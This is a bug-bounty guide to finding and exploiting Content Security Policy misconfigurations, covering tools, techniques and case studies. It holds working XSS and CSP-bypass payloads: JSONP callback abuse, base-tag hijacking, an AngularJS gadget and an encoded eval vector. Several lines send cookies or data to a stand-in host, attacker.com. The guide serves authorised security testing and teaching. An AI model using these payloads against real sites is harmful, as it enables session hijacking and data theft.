# Complete Methodology to Exploit CSP: A Practical Guide

This guide walks you through how to systematically test for and exploit Content Security Policy (CSP) weaknesses, using real-world examples, tools, and step-by-step techniques that have worked in actual bug bounty programs.

---

## Table of Contents

1. [Understanding CSP Basics](#understanding-csp-basics)
2. [Your CSP Testing Toolkit](#your-csp-testing-toolkit)
3. [Systematic Testing Methodology](#systematic-testing-methodology)
4. [Exploitation Techniques with Real Examples](#exploitation-techniques-with-real-examples)
5. [Real-World Case Studies](#real-world-case-studies)
6. [Testing with Burp Suite: Step-by-Step](#testing-with-burp-suite-step-by-step)
7. [Automated Tools & Extensions](#automated-tools--extensions)
8. [Advanced Scenarios & Edge Cases](#advanced-scenarios--edge-cases)
9. [Checklist for Bug Bounty Hunters](#checklist-for-bug-bounty-hunters)

---

## Understanding CSP Basics

A Content Security Policy is a browser security mechanism that restricts which resources (scripts, stylesheets, images, etc.) can be loaded and executed on a webpage . It works by checking resources against an allowlist defined in the `Content-Security-Policy` header.

**How CSP is delivered:**
- HTTP response header (most common)
- HTML meta tag: `<meta http-equiv="Content-Security-Policy" content="...">` 

**Key directives to focus on during testing:**

| Directive | Controls | Why Important |
|-----------|----------|----------------|
| `script-src` | JavaScript sources | Primary target for XSS exploitation |
| `object-src` | Flash, Java, plugins | Often forgotten → easy bypass |
| `base-uri` | Base URL for relative paths | Missing = URL hijacking |
| `default-src` | Fallback for other directives | Sets baseline permissions |

---

## Your CSP Testing Toolkit

### Essential Tools

**1. Burp Suite Extensions**
- **CSP Recon** - Extracts domains, URLs, and report URIs from CSP headers passively 
- **CSP-Bypass** - Detects known bypass techniques and provides payload examples 

**2. Browser Extensions**
- **JSONPeek** (Firefox) - Identifies JSONP endpoints that can be abused for CSP bypass 
- **CSP B Gone** (Firefox) - Automatically detects vulnerable CSPs and generates POC payloads 

**3. Online Validators**
- **Google CSP Evaluator** - `https://csp-evaluator.withgoogle.com/` - Quickly identifies common misconfigurations 

**4. Manual Testing Setup**
- Browser Developer Tools (F12) - Network tab to view CSP headers, Console tab to see violation errors
- Text editor for payload construction and encoding

---

## Systematic Testing Methodology

### Step 1: Capture the CSP Header

When you encounter a page, open Developer Tools → Network tab → click the document request. Find the `Content-Security-Policy` header and copy its entire value .

**Example captured header:**
```
Content-Security-Policy: script-src 'self' https://google.com 'unsafe-inline'; object-src 'none'
```

### Step 2: Analyze Each Directive

Go through each directive systematically and check for dangerous patterns:

| Red Flag | What to Look For | Severity |
|----------|------------------|----------|
| `'unsafe-inline'` in script-src | Allows any inline script | Critical |
| `'unsafe-eval'` in script-src | Allows eval(), setTimeout(string) | High |
| `*` (wildcard) | Allows any domain | Critical |
| `https:` (scheme wildcard) | Allows any HTTPS domain | High |
| Missing `base-uri` | Can inject base tags to hijack relative URLs | High |
| Missing `object-src` | Falls back to default-src or * | Medium |
| Third-party CDNs | May host vulnerable libraries or JSONP endpoints | Medium |

### Step 3: Test for Basic Bypasses First

Start with the simplest techniques before moving to complex ones :

**Test for 'unsafe-inline':**
```html
<script>alert('CSP Bypass')</script>
```
If this works, you're done. Many bug bounty reports are exactly this .

**Test for missing object-src:**
```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
```

**Test for missing base-uri:**
```html
<base href="https://attacker.com/">
<script src="/js/app.js"></script>
<!-- Now loads from attacker.com/js/app.js -->
```

### Step 4: Examine Whitelisted Domains

If `script-src` contains specific domains (e.g., `*.google.com`, `cdn.example.com`), these are your targets. Your goal is to make one of these trusted domains execute JavaScript for you .

**For each whitelisted domain, check for:**
- JSONP endpoints with callback parameters
- File upload functionality (can you upload a .js file?)
- Open redirects (can you chain to a JSONP endpoint?)
- Old JavaScript libraries (AngularJS < 1.6, vulnerable Prototype.js)

### Step 5: Test JSONP Endpoints

JSONP endpoints are the most common CSP bypass vector . Look for parameters like:
- `callback=`
- `jsonp=`
- `cb=`
- `function=`

**Test payload:**
```html
<script src="https://whitelisted-domain.com/endpoint?callback=alert(1)"></script>
```

If the server responds with something like `alert(1)({"data":...})`, you've found a bypass .

### Step 6: Test File Upload Vectors

If the application allows file uploads and serves them from a whitelisted domain, upload a JavaScript file .

**Attack flow:**
1. Upload a file named `payload.js` with content `alert(document.domain)`
2. Get the URL: `https://whitelisted-cdn.com/uploads/payload.js`
3. Inject: `<script src="https://whitelisted-cdn.com/uploads/payload.js"></script>`

**Real example:** A researcher found `script-src: 'self' cdn.example.com` where the CDN was actually an S3 bucket storing user avatars. They uploaded a JavaScript file disguised as an image and got a $3,000 bounty .

---

## Exploitation Techniques with Real Examples

### Technique 1: The 'unsafe-inline' Instant Win

**Vulnerable CSP:**
```
script-src 'self' 'unsafe-inline'
```

**Payload:**
```html
<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
```

**Why it works:** `'unsafe-inline'` completely defeats CSP's primary protection. This is the most common misconfiguration found in the wild .

### Technique 2: JSONP Abuse on Whitelisted Domains

**Vulnerable CSP:**
```
script-src https://accounts.google.com
```

**Payload:**
```html
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>
```

**Why it works:** The whitelisted domain has a JSONP endpoint that reflects the callback parameter into executable JavaScript .

**Real Google JSONP endpoints:**
- `https://accounts.google.com/o/oauth2/revoke?callback=alert`
- `https://www.google.com/complete/search?client=chrome&q=a&jsonp=alert`

### Technique 3: CDN Library Exploitation

**Vulnerable CSP:**
```
script-src 'self' cdnjs.cloudflare.com
```

**Payload:**
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js"></script>
<div ng-app ng-csp>
  {{$on.curry.call().alert('xss')}}
</div>
```

**Why it works:** The whitelisted CDN hosts vulnerable library versions. AngularJS 1.0.8 has a CSP bypass using its expression syntax .

### Technique 4: Base Tag Hijacking

**Vulnerable CSP:** (missing `base-uri` directive)

**Payload:**
```html
<base href="https://attacker.com/">
<script src="/static/app.js"></script>
```

**Why it works:** The browser resolves `/static/app.js` to `https://attacker.com/static/app.js`, bypassing the `script-src` restriction .

### Technique 5: The 'unsafe-eval' + SVG Vector

**Vulnerable CSP:**
```
script-src 'self' 'unsafe-eval'
```

**Payload:**
```html
<svg><animate onbegin=eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))>
```

**Why it works:** `'unsafe-eval'` allows `eval()` execution. The base64 string decodes to `alert(document.domain)` .

### Technique 6: MIME Type Confusion (n8n CVE-2026-27578)

**Vulnerable CSP:** (sandbox only applied to denylisted content types)

**Payload:** Send response with `Content-Type: image/svg+xml` containing embedded JavaScript

**Why it works:** SVG files can contain `<script>` tags and execute JavaScript in the document context. If the CSP sandbox only applies to `text/html` but not `image/svg+xml`, the script executes .

---

## Real-World Case Studies

### Case Study 1: $2,500 Bounty from Simple 'unsafe-inline'

**Scenario:** E-commerce platform with CSP: `script-src 'self' 'unsafe-inline' *.cloudflare.com`

**Discovery:** Simple test with `<script>alert(1)</script>` worked immediately .

**Lesson:** Never skip the basics. Many sites with CSP still have `'unsafe-inline'` enabled for legacy compatibility.

### Case Study 2: $3,000 Bounty via CDN File Upload

**Scenario:** CSP: `script-src 'self' cdn.example.com`. The CDN was an S3 bucket storing user-uploaded profile pictures.

**Discovery:** 
1. Found profile picture upload functionality
2. Uploaded `alert.js` disguised as `profile.jpg`
3. The file was served from `cdn.example.com/uploads/profile.jpg`
4. Injected `<script src="https://cdn.example.com/uploads/profile.jpg"></script>`
5. Script executed because the domain was whitelisted 

### Case Study 3: n8n CSP Sandbox Bypass (CVE-2026-27578)

**Scenario:** n8n workflow platform added a CSP sandbox to webhook responses with `text/html` content type.

**Discovery:** 
1. Attacker set `Content-Type: image/svg+xml` in webhook response
2. SVG contained `<script>alert(document.cookie)</script>`
3. `image/svg+xml` was NOT on the denylist
4. Script executed in n8n origin context, enabling session hijacking 

**Fix:** n8n removed the denylist and now applies CSP sandbox to ALL webhook responses.

---

## Testing with Burp Suite: Step-by-Step

### Setup

1. **Install Jython** in Burp Suite (Extensions → Options → Python Environment)
2. **Install CSP Recon** :
   - Download `csprecon-burp.py`
   - Extensions → Installed → Add → Select Python → Choose file
3. **Install CSP-Bypass** :
   - Similar installation process
   - Configure custom rules in `csp_known_bypasses.py` if needed

### Testing Workflow in Burp

**Step 1: Passive Reconnaissance**
- Browse the target application normally
- CSP Recon automatically extracts all CSP headers and shows them in the Issues tab 
- Note all whitelisted domains and directives

**Step 2: Identify Attack Surface**
For each whitelisted domain from CSP Recon:
- Spider the domain for JSONP endpoints (look for `callback=`, `jsonp=`)
- Check for file upload endpoints
- Look for open redirects

**Step 3: Test Payloads**
Use CSP-Bypass to automatically test known bypasses :
- The plugin will highlight vulnerable CSP configurations
- Provides ready-to-use payloads for testing

**Step 4: Manual Verification**
For each potential bypass:
1. Send the payload in an XSS injection point (parameter, form field, etc.)
2. Check if script executes
3. If blocked, check console for CSP violation errors to understand why

### Using Repeater for CSP Testing

1. Send a request to Repeater
2. Modify response to inject test payloads
3. Test different CSP bypass techniques
4. Monitor response headers for CSP changes

---

## Automated Tools & Extensions

### JSONPeek (Firefox)

**Purpose:** Identify JSONP endpoints that can be abused for CSP bypass 

**How to use:**
1. Install the Firefox extension
2. Browse to your target
3. Open JSONPeek extension - it shows detected JSONP-like requests
4. Click the "exploit" button to automatically test if the endpoint is vulnerable
5. Green checkmarks indicate successful bypasses

### CSP B Gone (Firefox)

**Purpose:** Automatically detect vulnerable CSPs and generate POC payloads 

**How to use:**
1. Install the extension
2. Visit any website
3. Extension analyzes the CSP header
4. If bypasses exist, it provides copy-paste payloads
5. Tested on facebook.com and other major sites

### CSP Recon (Burp)

**Purpose:** Extract and organize CSP information from HTTP responses 

**Features:**
- Extracts domains, URLs, and report URIs from CSP headers
- Detects different CSP policies on the same application
- Reports findings as informational issues in Burp

### Google CSP Evaluator

**Purpose:** Online tool for quick CSP analysis 

**How to use:**
1. Go to `https://csp-evaluator.withgoogle.com/`
2. Paste your CSP header
3. Tool highlights issues and explains risks
4. Provides recommendations for fixes

---

## Advanced Scenarios & Edge Cases

### Bypassing Nonce-Based CSP

Modern CSPs use `'nonce-...'` to allow specific inline scripts. These are harder but not impossible to bypass.

**Cache-based nonce bypass:** Researchers have demonstrated forcing pages from disk cache (bfcache) while maintaining a reference to the page, potentially reusing nonces .

### Data Exfiltration Despite CSP

Even with strict CSP, data exfiltration is possible through:

**Image tags:** `<img src="https://attacker.com/steal?data=leaked">`

**Redirects:** `window.location='https://attacker.com/steal?'+document.cookie`

**CSS injection:** `body { background: url('https://attacker.com/steal?'+encodeURIComponent(data)) }`

### Bypassing 'self' with Relative Path Confusion

If `script-src 'self'` but the application uses relative paths, you might inject:

```html
<script src="/../evil.com/xss.js"></script>
```

Path normalization varies by server and browser.

---

## Checklist for Bug Bounty Hunters

Before leaving a target, verify each item:

### Quick Wins (5-minute check)
- [ ] `'unsafe-inline'` present in script-src? → Test `<script>alert(1)</script>`
- [ ] `'unsafe-eval'` present? → Test SVG + eval payload
- [ ] Missing `object-src`? → Test object data URI
- [ ] Missing `base-uri`? → Test base tag hijacking

### Whitelist Analysis (15-minute check)
- [ ] List all domains in script-src
- [ ] For each domain, check for JSONP endpoints
- [ ] For each domain, check for file upload
- [ ] For each domain, check for open redirects
- [ ] For each CDN, check library versions for known bypasses

### Deep Testing (30-minute check)
- [ ] Can you upload any file to a whitelisted domain?
- [ ] Are there subdomains with different CSP policies?
- [ ] Is CSP applied via meta tag? (Less secure than header)
- [ ] Are there report-uri endpoints that leak information?
- [ ] Can you inject into CSP header itself? (Policy injection)

### Advanced (If time permits)
- [ ] Test cache-based nonce bypass techniques
- [ ] Test MIME type confusion (SVG, PDF, etc.)
- [ ] Test Content-Type sniffing bypasses
- [ ] Test for DOM-based CSP bypass via JavaScript gadgets

---

## Common Pitfalls to Avoid

**Pitfall 1:** Stopping at the first blocked payload
- Just because `<script>alert(1)</script>` is blocked doesn't mean CSP is secure
- Try different vectors: `<img src=x onerror=alert(1)>`, `<svg onload=alert(1)>`

**Pitfall 2:** Ignoring subdomains
- `script-src 'self'` might allow `subdomain.example.com` if it's the same origin
- Test all subdomains for XSS, JSONP, and file upload

**Pitfall 3:** Assuming CDNs are safe
- Even major CDNs host vulnerable library versions
- Check the exact version being loaded, not just the domain

**Pitfall 4:** Forgetting about report-uri
- Some CSPs have `report-uri` that sends violation reports to an endpoint
- These endpoints sometimes reflect data or have their own vulnerabilities

---

## Summary

CSP testing follows a simple methodology:

1. **Capture** the CSP header
2. **Identify** dangerous directives (`unsafe-inline`, `unsafe-eval`, wildcards)
3. **Analyze** whitelisted domains (JSONP, file upload, old libraries)
4. **Test** systematically from simplest to most complex payloads
5. **Exploit** using the techniques that work

Remember: Most CSP bypasses in bug bounties come from basic misconfigurations, not complex techniques . Start simple, escalate only when necessary.

**The key insight from real-world testing:** CSP is only as strong as its weakest allowed domain. One JSONP endpoint or one old AngularJS library on a whitelisted domain is all you need .
